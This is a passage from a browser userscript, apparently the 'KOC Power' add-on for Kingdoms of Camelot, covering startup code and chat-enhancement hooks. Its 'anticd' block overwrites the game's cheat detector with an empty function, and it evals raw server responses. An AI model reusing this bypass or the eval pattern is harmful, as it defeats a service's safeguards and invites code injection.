	if (Options.pdxTimeZones=="cestTimeZone") cestClock.init ();
	if (Options.pdxTimeZones=="gmtTimeZone") gmtClock.init ();
	if (Options.pdxTimeZones=="pstTimeZone") pstClock.init ();
	if (Options.pdxTimeZones=="noneTimeZone") noTimeZone.init ();

  if (Options.pbWinIsOpen && Options.pbTrackOpen){
    mainPop.show (true);
    tabManager.showTab();
  }

  readPDXCountOpt();
  readWallTrainOptions();
  if (WallTrainOptions.intervalSecs < 60)
	  WallTrainOptions.intervalSecs = 60;
  saveWallTrainOptions();

  window.addEventListener('unload', onUnload, false);
  exportToKOCattack.init();
  WideScreen.init ();
  WideScreen.setChatOnRight (Options.pbChatOnRight);
  WideScreen.useWideMap (Options.pbWideMap);
  
  getAllianceLeaders();
  MapDistanceFix.init ();
  WarnZeroAttack.init ();
  AllianceReports.init ();
  AttackDialog.init();
  battleReports.init ();
  CoordBox.init ();
  FoodAlerts.init();
  ChatPane.init();
  ChatStuff.init();
  ChatStuffE.init()
  DeleteReports.init();
  SpamEvery.init();
  SpamEveryA.init();
  //PDXCountdown.init();
  if (Options.MapShowExtra) setInterval (DrawLevelIcons,1250);
  var params=unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);params.format=2;params.tournyPos=0;new AjaxRequest(unsafeWindow.g_ajaxpath+"ajax/getLeaderboard.php"+unsafeWindow.g_ajaxsuffix,{method:"post",parameters:params,onSuccess:function(transport){var rslt=eval("("+transport.responseText+")");if(rslt.ok){if(rslt.data){document.getElementById("ptBoite2").innerHTML='<span style="color: #f66"> <blink>'+culang.turn+'</blink> </span>';Options.enableCheckTournoi=false;saveOptions()}else{Options.enableCheckTournoi=true}}else{Options.enableCheckTournoi=true}}})
  if (Options.enableCheckTournament) checkTournament.init();
  actionLog ("<b>"+kocpower+"</b> - "+culang.scriptv+": <span class=boldRed>"+ Version +"</span> - "+culang.by+" "+culang.kocPowerP+"  <span class=boldGreen>"+culang.sucload+"!</span>  (KOC Version: <span class=boldRed>"+ anticd.getKOCversion() +"</span>)"); // ALL INIT LOADED
} // END PDXSTARTUP FUNC

function onUnload (){
  Options.ptWinPos = mainPop.getLocation();
  if (!ResetAll) saveOptions();
  if (!ResetColors) saveColors();
  if (!ResetStyleOptions) saveStyleOptions(); 
}
var CoordBox = {
  init : function (){
    var t = CoordBox;
    t.boxDiv = searchDOM (document.getElementById('maparea_map'), 'node.className=="mod_coord"', 3, false);
    t.setEnable (Options.mapCoordsTop);
  },
  setEnable : function (tf){
    var t = CoordBox;
    if (t.boxDiv == null)
      return;
    if (tf)
      t.boxDiv.style.zIndex = '100000';
    else
      t.boxDiv.style.zIndex = '10011';
  },
  isAvailable : function (){
    var t = CoordBox;
    return !(t.boxDiv==null);
  },
}
/********************************************************************************
* 					KOC POWER - BATTLE REPORTS									*
********************************************************************************/
if(!false) eval(GM_getResourceText( 'PLUGIN_RPTBATTLE' ));

var anticd = {
  isInited : false,
  KOCversion : '?',
  
  init: function (){
    if (this.isInited)
      return this.KOCversion;
    unsafeWindow.cm.cheatDetector.detect = eval ('function a (){}');
    var scripts = document.getElementsByTagName('script');
    for (var i=0; i<scripts.length; i++){
      if (scripts[i].src.indexOf('camelotmain') >=0){
        break;
      }
    }
    if (i<scripts.length){
      var m = scripts[i].src.match (/camelotmain-(.*).js/);  
      if (m)
        this.KOCversion = m[1];
    }
    this.isInited = true;
  },
  
  getKOCversion : function (){
    return this.KOCversion;
  },
}
try {  anticd.init (); } catch (e){  logit ("ANTICD error: "+ e);}


/********************************************************************************
* 					KOC POWER - CHAT STUFF EXTRA								*
********************************************************************************/
var ChatStuffE = {
  chatDivContentFunc : null,
  getChatFunc : null,

  init : function (){
    var t = ChatStuffE;
	t.chatDivContentFunc = new CalterUwFunc ('Chat.chatDivContent', [['return f.join("");', 'var msg = f.join("");\n msg=chatDivContent_hook(msg);\n return msg;']]);
    unsafeWindow.chatDivContent_hook = t.chatDivContentHook;
	unsafeWindow.ptChatReportClicked = Rpt.FindReport;
    t.setEnable (Options.chatEnhance);
  },

  isAvailable : function (){    var t = ChatStuffE;    t.chatDivContentFunc.isAvailable ();  },

  setEnable : function (tf){
    var t = ChatStuffE;
    t.chatDivContentFunc.setEnable (tf);
		if (Options.ChatBGColorGlobal) { document.getElementById("mod_comm_list1").style.backgroundColor = Colors.OwnBackgroundColorGlobal; }	
		if (Options.ChatBGColorAlliance) { document.getElementById("mod_comm_list2").style.backgroundColor = Colors.OwnBackgroundColorAlliance; }	
		if (Options.ChatBGImageGlobal) { document.getElementById("mod_comm_list1").style.backgroundImage = "url(" + Options.OwnBackGroundGlobal + ")"; }	
		if (Options.ChatBGImageAlliance) { document.getElementById("mod_comm_list2").style.backgroundImage = "url(" + Options.OwnBackGroundAlliance + ")"; }
  },
  
  chatDivContentHook : function (msg){
       var t = ChatStuffE; 
       var element_class = '';
       var m = /div class='info'>.*<\/div>/im.exec(msg);
       if (m == null)
         return msg;
       var whisp = m[0];
       
       if (m[0].indexOf(''+culang.whispersa+'') >= 0) {
           	if (Options.chatwhisper) {
           		if (whisp.indexOf(''+culang.whispersa+' ') <0) element_class = 'ptChatWhisper';
           	}
           	else element_class = '';
     }
	       else if (m[0].indexOf(''+culang.saytoalli+'') >= 0){
   	if (Options.chatbold)
   		element_class = 'ptChatAlliance';
   	else element_class = '';
     } else {
   	element_class = '';
     }
	// AVATARS
	var scripters = ["7552815","10681588","1747877","2865067","10153485","15182839","1550996","1617431819","9688786","9863346","8184813"];	var pdxTeamAvatars = ["12008696","3176423","14627712","14259780","3579672","4025915","4279942","1626224297","295989923", "7908173", "8417585", "3671609","12008696","3176423","?9183757"];
	var pdxVipAvatars = ["7582657", "13441699", "7878488", "10476427", "7369136", "1253779", "13790889", "13280547", "3594655", "13040635", "12608417", "8835446", "7104994", "12080505","14749716","8963000","7484821","8249109","8199981","9881463", "13776129", "7873544","10638478", "7104994", "12372613", "8921744", "9132829", "6237739","14160674","10037316","14439617","7898468","10476427","10226316","8645255","737643","13308256","3696512","6144252","8643671","7999794","12036033","11223167","8535764","5002677","3963323","8120576","9233010"];
	var FrancescoVenturini  = [ "4578192"]; var BernhardKuehr  = [ "13858381"]; var EnricoHanke  = [ "15705275"]; var GuntherScheuenpflug  = [ "11421886"]; var JuanBta  = [ "12210885"]; var TonyaMccurley  = [ "7240252"]; var StefanPohland  = [ "6466258"]; var MaxPower  = [ "16067742"];  var HansJuergen  = [ "9862911"];  var ChristianBrechtel  = [ "13509454"]; var ChrissieGriffiths  = [ "5997140"]; var MartinvonW  = [ "10932295"]; var AlexanderImm = [ "8798327"]; var FabiAn = [ "7917417"]; var DominikBecker = ["7185945"]; var FlorianWe = ["9290091"]; var HelmutZipser  = ["7413801"]; var OrthRaphael = ["10891251"]; var HeikoWagner = ["11125128"]; var AtlandaGonozal = ["13435437"]; var OsoLoc = ["14398640"]; var LionNess = ["4377803"]; var IgorGarcia = ["12471422"]; var BlackMouse = ["16004813"]; var LadyBetrayed = ["6480836"]; var Jordij = ["6717661"]; var JohnGriffiths = ["6240023"];
	var suid = m[0].substring(m[0].indexOf('Chat.viewProfile(this,')+22,m[0].indexOf(',false);return false;'));
	var IsMe = false;
	if (Options.chatLeaders) {
	if (Options.AllianceLeaders.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;
	if (Options.AllianceLeaders.indexOf(suid) >= 0 || IsMe) element_class = 'ptChatOfficers';
	}
	IsMe = false;
	if (scripters.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;
	if (scripters.indexOf(suid) >= 0 || IsMe) {	msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGkocScripters+'\'\/\>'); element_class = 'ptChatScripter';	}	if (pdxTeamAvatars.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (pdxTeamAvatars.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGpdxTeam+'\'\/\>'); }	if (pdxVipAvatars.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (pdxVipAvatars.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGpdxVip+'\'\/\>');}
	if (DominikBecker.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (DominikBecker.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGdominikbecker+'\'\/\>');}		if (FlorianWe.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	    if (FlorianWe.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGflorianwe+'\'\/\>');}		if (HelmutZipser.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (HelmutZipser.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGhelmutzipser+'\'\/\>');}		if (OrthRaphael.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (OrthRaphael.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGorthraphael+'\'\/\>');} 	if (HeikoWagner.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (HeikoWagner.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGheikowagner+'\'\/\>');}	if (AtlandaGonozal.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (AtlandaGonozal.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGatlandaGonozal+'\'\/\>');}  	if (FabiAn.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (FabiAn.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGfabiAn+'\'\/\>');}  if (OsoLoc.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (OsoLoc.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGosoLoc+'\'\/\>');} 	if (LionNess.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (LionNess.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGlionNess+'\'\/\>');} 	if (IgorGarcia.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (IgorGarcia.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGigorGarcia+'\'\/\>');} 	if (LadyBetrayed.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (LadyBetrayed.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGladyBetrayed+'\'\/\>');} 	if (Jordij.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (Jordij.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGjordiJ+'\'\/\>');}  if (BlackMouse.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (BlackMouse.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGblackMouse+'\'\/\>');} 	if (JohnGriffiths.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (JohnGriffiths.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGjohnGriffiths+'\'\/\>');} 	if (AlexanderImm.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (AlexanderImm.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGalexanderImm+'\'\/\>');} 	if (MartinvonW.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (MartinvonW.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGmartinvonW+'\'\/\>');}  if (ChrissieGriffiths.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (ChrissieGriffiths.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGchrissieGriffiths+'\'\/\>');} 	if (ChristianBrechtel.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (ChristianBrechtel.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGchristianBrechtel+'\'\/\>');}  	if (HansJuergen.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (HansJuergen.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGhansJuergen+'\'\/\>');}  if (MaxPower.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (MaxPower.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGmaxPower+'\'\/\>');}  	if (StefanPohland.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (StefanPohland.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGstefanPohland+'\'\/\>');} 	if (TonyaMccurley.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (TonyaMccurley.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGtonyaMccurley+'\'\/\>');} 	if (GuntherScheuenpflug.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (GuntherScheuenpflug.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGguntherScheuenpflug+'\'\/\>');} 	if (JuanBta.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (JuanBta.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGjuanBta+'\'\/\>');} 
	if (EnricoHanke.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (EnricoHanke.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGenricoHanke+'\'\/\>');} 
	if (BernhardKuehr.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (BernhardKuehr.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGbernhardKuehr+'\'\/\>');} 
	if (FrancescoVenturini.indexOf(uW.tvuid) >= 0 && suid.substr(0, 3)=="div") IsMe = true;	if (FrancescoVenturini.indexOf(suid) >= 0 || IsMe) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, IMGfrancescoVenturini+'\'\/\>');} 
	if (suid==unsafeWindow.tvuid && Options.UserAvatar) { msg = msg.replace (/\bhttps\:\/\/[-a-z].*\'\/\>/i, Options.UserAvatarURL+'\'\/\>' ); }
	//END OF AVATARS

	// CHAT BACKGROUNDS
	// ATTACK
	if (m[0].indexOf(''+culang.pTcembIT+'') >= 0 || m[0].indexOf(''+culang.pTcembGR+'') >= 0 || m[0].indexOf(''+culang.pTcembES+'') >= 0 || m[0].indexOf(''+culang.pTcembFR+'') >= 0 || m[0].indexOf(''+culang.pTcembPT+'') >= 0 || m[0].indexOf(''+culang.pTcembDE+'') >= 0 || m[0].indexOf(''+culang.pTcembEN+'') >= 0 && Options.chatAttack)  { msg += '<div style="position: absolute; background-image: url(\''+IMGattacking+'\');   background-repeat: no-repeat; border-radius: 3px 3px 3px 3px; height: 18px; width: 18px; border: 2px inset rgb(96, 0, 0); box-shadow: 0px 0px 2px rgb(255, 255, 255); left: 9px; top: 55px; "></div>'; element_class = 'ptChatAttack';	}
	if (m[0].indexOf(''+culang.pTcembIT+'') >= 0 || m[0].indexOf(''+culang.pTcembGR+'') >= 0 || m[0].indexOf(''+culang.pTcembES+'') >= 0 || m[0].indexOf(''+culang.pTcembFR+'') >= 0 || m[0].indexOf(''+culang.pTcembPT+'') >= 0 || m[0].indexOf(''+culang.pTcembDE+'') >= 0 || m[0].indexOf(''+culang.pTcembEN+'') >= 0 && Options.enableTowerAlert) { msg +='<span id"towersound"><object type="application/x-shockwave-flash" data="'+pdxMiniSWFplayer+'" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="'+pdxMiniSWFplayer+'" /><param name="flashvars" value="mp3='+ Options.soundURL2 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson2vol +'" /></object></span>';}	
	// KOC ALLIANCE - EXTRA ATTACK
	if (m[0].indexOf(''+culang.embtroopsTR+'') >= 0 || m[0].indexOf(''+culang.embtroopsPT+'') >= 0 ||  m[0].indexOf(''+culang.embtroopsGR+'') >= 0 ||  m[0].indexOf(''+culang.embtroopsES+'') >= 0 ||   m[0].indexOf(''+culang.embtroopsFR+'') >= 0 ||  m[0].indexOf(''+culang.embtroopsIT+'') >= 0 ||  m[0].indexOf(''+culang.embtroopsEN+'') >= 0 ||  m[0].indexOf(''+culang.embtroopsDE+'') >= 0  && Options.chatAttack) { 	msg += '<div style="position: absolute; background-image: url(\''+IMGattacking+'\');   background-repeat: no-repeat; border-radius: 3px 3px 3px 3px; height: 18px; width: 18px; border: 2px inset rgb(96, 0, 0); box-shadow: 0px 0px 2px rgb(255, 255, 255); left: 9px; top: 55px; "></div>'; element_class = 'ptChatAttack'; }
	if (m[0].indexOf(''+culang.embtroopsTR+'') >= 0 || m[0].indexOf(''+culang.embtroopsPT+'') >= 0 ||  m[0].indexOf(''+culang.embtroopsGR+'') >= 0 ||  m[0].indexOf(''+culang.embtroopsES+'') >= 0 ||   m[0].indexOf(''+culang.embtroopsFR+'') >= 0 ||  m[0].indexOf(''+culang.embtroopsIT+'') >= 0 ||  m[0].indexOf(''+culang.embtroopsEN+'') >= 0 ||  m[0].indexOf(''+culang.embtroopsDE+'') >= 0 && Options.enableTowerAlert) {  msg +='<span id"towersoundae"><object type="application/x-shockwave-flash" data="'+pdxMiniSWFplayer+'" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="'+pdxMiniSWFplayer+'" /><param name="flashvars" value="mp3='+ Options.soundURL2 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson2vol +'" /></object></span>';}	 
	// WILD ATTACK
	if (m[0].indexOf(''+culang.pTcmywildTR+'') >= 0 || m[0].indexOf(''+culang.pTcmywildPT+'') >= 0 || m[0].indexOf(''+culang.pTcmywildGR+'') >= 0 || m[0].indexOf(''+culang.pTcmywildES+'') >= 0 || m[0].indexOf(''+culang.pTcmywildFR+'') >= 0 || m[0].indexOf(''+culang.pTcmywildIT+'') >= 0 || m[0].indexOf(''+culang.pTcmywildEN+'') >= 0 || m[0].indexOf(''+culang.pTcmywildDE+'') >= 0 && Options.chatWildAttack) { msg += '<div style="position: absolute; background-image: url(\''+IMGgrassland18+'\');   background-repeat: no-repeat; border-radius: 3px 3px 3px 3px; height: 18px; width: 19px; border: 2px inset rgb(96, 0, 0); box-shadow: 0px 0px 2px rgb(255, 255, 255); left: 8px; top: 55px; "></div>'; element_class = 'ptWildAttack';}
	if (m[0].indexOf(''+culang.pTcmywildTR+'') >= 0 || m[0].indexOf(''+culang.pTcmywildPT+'') >= 0 || m[0].indexOf(''+culang.pTcmywildGR+'') >= 0 || m[0].indexOf(''+culang.pTcmywildES+'') >= 0 || m[0].indexOf(''+culang.pTcmywildFR+'') >= 0 || m[0].indexOf(''+culang.pTcmywildIT+'') >= 0 || m[0].indexOf(''+culang.pTcmywildEN+'') >= 0 || m[0].indexOf(''+culang.pTcmywildDE+'') >= 0 && Options.enableTowerAlertWild) { msg +='<span id"wildsound"><object type="application/x-shockwave-flash" data="'+pdxMiniSWFplayer+'" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="'+pdxMiniSWFplayer+'" /><param name="flashvars" value="mp3='+ Options.soundURL4 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson4vol +'" /></object></span>';}		  
	// LOW FOOD
	if (m[0].indexOf(''+culang.lowfoodrTR+'') >= 0 || m[0].indexOf(''+culang.lowfoodrPT+'') >= 0 || m[0].indexOf(''+culang.lowfoodrGR+'') >= 0 || m[0].indexOf(''+culang.lowfoodrES+'') >= 0 || m[0].indexOf(''+culang.lowfoodrFR+'') >= 0 || m[0].indexOf(''+culang.lowfoodrIT+'') >= 0 || m[0].indexOf(''+culang.lowfoodrEN+'') >= 0 || m[0].indexOf(''+culang.lowfoodrDE+'') >= 0 && Options.enableFoodChatAlertBG) { msg += '<div style="position: absolute; background-image: url(\''+IMGfood18+'\');   background-repeat: no-repeat; border-radius: 3px 3px 3px 3px; height: 18px; width: 30px; border: 2px inset rgb(96, 0, 0); box-shadow: 0px 0px 2px rgb(255, 255, 255); left: 3px; top: 55px; "></div>'; element_class = 'ptChatLowFood';}
	if (m[0].indexOf(''+culang.lowfoodrTR+'') >= 0 || m[0].indexOf(''+culang.lowfoodrPT+'') >= 0 || m[0].indexOf(''+culang.lowfoodrGR+'') >= 0 || m[0].indexOf(''+culang.lowfoodrES+'') >= 0 || m[0].indexOf(''+culang.lowfoodrFR+'') >= 0 || m[0].indexOf(''+culang.lowfoodrIT+'') >= 0 || m[0].indexOf(''+culang.lowfoodrEN+'') >= 0 || m[0].indexOf(''+culang.lowfoodrDE+'') >= 0 && Options.enableFoodChatAlert) { msg +='<span id"lowfoodsound"><object type="application/x-shockwave-flash" data="'+pdxMiniSWFplayer+'" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="'+pdxMiniSWFplayer+'" /><param name="flashvars" value="mp3='+ Options.soundURL3 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson3vol +'" /></object></span>';}	 	
	// FUN ALERTS
	if (m[0].indexOf(''+culang.OSAattackfetch+'') >= 0 && Options.OSAattack) { msg +='<span id"funsoundattack"><object type="application/x-shockwave-flash" data="'+pdxMiniSWFplayer+'" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="'+pdxMiniSWFplayer+'" /><param name="flashvars" value="mp3='+ Options.soundURL5 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson5vol +'" /></object></span>';}	   
	if (m[0].indexOf(''+culang.OSAhornfetch+'') >= 0 && Options.OSAhorn) { msg +='<span id"funsoundhorn"><object type="application/x-shockwave-flash" data="'+pdxMiniSWFplayer+'" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="'+pdxMiniSWFplayer+'" /><param name="flashvars" value="mp3='+ Options.soundURL6 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson6vol +'" /></object></span>';}	  
	if (m[0].indexOf(''+culang.OSAgunfetch+'') >= 0 && Options.OSAgun) { element_class = 'pdxFunSoundGun'; msg += '<div id"funsoundgun"><object type="application/x-shockwave-flash" data="'+pdxMiniSWFplayer+'" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="'+pdxMiniSWFplayer+'" /><param name="flashvars" value="mp3='+ Options.soundURL7 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLson7vol +'" /></object></div>'; }
	// NICK HIGHLITER SYSTEM
	if (m[0].indexOf(Options.userNameSou1) >= 0 && Options.enableUsr1Sound && Options.enableNickColor==false) {	msg += '<div id"sonUsr1"><object type="application/x-shockwave-flash" data="'+pdxMiniSWFplayer+'" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="'+pdxMiniSWFplayer+'" /><param name="flashvars" value="mp3='+ Options.URLsonUsr1 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLsonUsr1vol +'" /></object></div>';} 
	if (m[0].indexOf(Options.userNameSou1) >= 0 && Options.enableNickColor && Options.enableUsr1Sound==false) {	element_class = 'ptChatUser1Sou';	}
	if (m[0].indexOf(Options.userNameSou1) >= 0 && Options.enableUsr1Sound && Options.enableNickColor==true) {	msg += '<div id"sonUsr1"><object type="application/x-shockwave-flash" data="'+pdxMiniSWFplayer+'" width="160" height="20" id="dewplayer" name="dewplayer"><param name="wmode" value="transparent" /><param name="movie" value="'+pdxMiniSWFplayer+'" /><param name="flashvars" value="mp3='+ Options.URLsonUsr1 +'&amp;autostart=1&amp;showtime=1&amp;volume='+ Options.URLsonUsr1vol +'" /></object></div>'; element_class = 'ptChatUser1Sou';}
	// PLAYER BACKGROUNDS
	if (m[0].indexOf(Options.userName1) >= 0 && Options.enableUserName1) { element_class = 'ptChatUser1'; }    if (m[0].indexOf(Options.userName2) >= 0 && Options.enableUserName2) { element_class = 'ptChatUser2'; }    if (m[0].indexOf(Options.userName3) >= 0 && Options.enableUserName3) { element_class = 'ptChatUser3'; }		if (m[0].indexOf(Options.userName4) >= 0 && Options.enableUserName4) { element_class = 'ptChatUser4'; }    if (m[0].indexOf(Options.userName5) >= 0 && Options.enableUserName5) { element_class = 'ptChatUser5'; }    if (m[0].indexOf(Options.userName6) >= 0 && Options.enableUserName6) { element_class = 'ptChatUser6'; }	if (m[0].indexOf(Options.userName7) >= 0 && Options.enableUserName7) { element_class = 'ptChatUser7'; }    if (m[0].indexOf(Options.userName8) >= 0 && Options.enableUserName8) { element_class = 'ptChatUser8'; }    if (m[0].indexOf(Options.userName9) >= 0 && Options.enableUserName9) { element_class = 'ptChatUser9'; }	if (m[0].indexOf(Options.userName10) >= 0 && Options.enableUserName10) { element_class = 'ptChatUser10'; }	if (m[0].indexOf(Options.userName11) >= 0 && Options.enableUserName11) { element_class = 'ptChatUser11'; }    if (m[0].indexOf(Options.userName12) >= 0 && Options.enableUserName12) { element_class = 'ptChatUser12'; }    if (m[0].indexOf(Options.userName13) >= 0 && Options.enableUserName13) { element_class = 'ptChatUser13'; }	if (m[0].indexOf(Options.userName14) >= 0 && Options.enableUserName14) { element_class = 'ptChatUser14'; }    if (m[0].indexOf(Options.userName15) >= 0 && Options.enableUserName15) { element_class = 'ptChatUser15'; }    if (m[0].indexOf(Options.userName16) >= 0 && Options.enableUserName16) { element_class = 'ptChatUser16'; }	if (m[0].indexOf(Options.userName17) >= 0 && Options.enableUserName17) { element_class = 'ptChatUser17'; }    if (m[0].indexOf(Options.userName18) >= 0 && Options.enableUserName18) { element_class = 'ptChatUser18'; }    if (m[0].indexOf(Options.userName19) >= 0 && Options.enableUserName19) { element_class = 'ptChatUser19'; }	if (m[0].indexOf(Options.userName20) >= 0 && Options.enableUserName20) { element_class = 'ptChatUser20'; }	if (m[0].indexOf(Options.userName21) >= 0 && Options.enableUserName21) { element_class = 'ptChatUser21'; }	if (m[0].indexOf(Options.userName21) >= 0 && Options.enableUserName21) { element_class = 'ptChatUser21'; }    if (m[0].indexOf(Options.userName22) >= 0 && Options.enableUserName22) { element_class = 'ptChatUser22'; }    if (m[0].indexOf(Options.userName23) >= 0 && Options.enableUserName23) { element_class = 'ptChatUser23'; }	if (m[0].indexOf(Options.userName24) >= 0 && Options.enableUserName24) { element_class = 'ptChatUser24'; }    if (m[0].indexOf(Options.userName25) >= 0 && Options.enableUserName25) { element_class = 'ptChatUser25'; }    if (m[0].indexOf(Options.userName26) >= 0 && Options.enableUserName26) { element_class = 'ptChatUser26'; }	if (m[0].indexOf(Options.userName27) >= 0 && Options.enableUserName27) { element_class = 'ptChatUser27'; }    if (m[0].indexOf(Options.userName28) >= 0 && Options.enableUserName28) { element_class = 'ptChatUser28'; }    if (m[0].indexOf(Options.userName29) >= 0 && Options.enableUserName29) { element_class = 'ptChatUser29'; }	if (m[0].indexOf(Options.userName30) >= 0 && Options.enableUserName30) { element_class = 'ptChatUser30'; }

	msg = msg.replace ("class='content'", "class='content "+ element_class +"'");

	if (msg.indexOf('claimAllianceChat')<0)
	msg = msg.replace (/([0-9]{1,3})\s*(,|-)\s*([0-9]{1,3})/img, '$1,$3');

	msg = msg.replace (/(\bReport No\:\s([0-9]+))/g, '<a onclick=\'ptChatReportClicked($2,0)\'>$1</a>');
	msg = msg.replace (/(\bBericht\:\s([0-9]+))/g, '<a onclick=\'ptChatReportClicked($2,0)\'>$1</a>');

	var m = /(Lord|Lady) (.*?)</im.exec(msg);
	 if (m != null)
	m[2] = m[2].replace(/\'/g,"??,"+culang.chatstuff+"");
	// m[2] = m[2].replace(/\'/g,""+culang.chatstuff+""); // m[1] = m[1].replace(/\'/a,"??");
	msg = msg.replace (/<img (.*?>)/img, '<img class=\"ptChatIcon\" $1');
	if (Options.Smiley) {
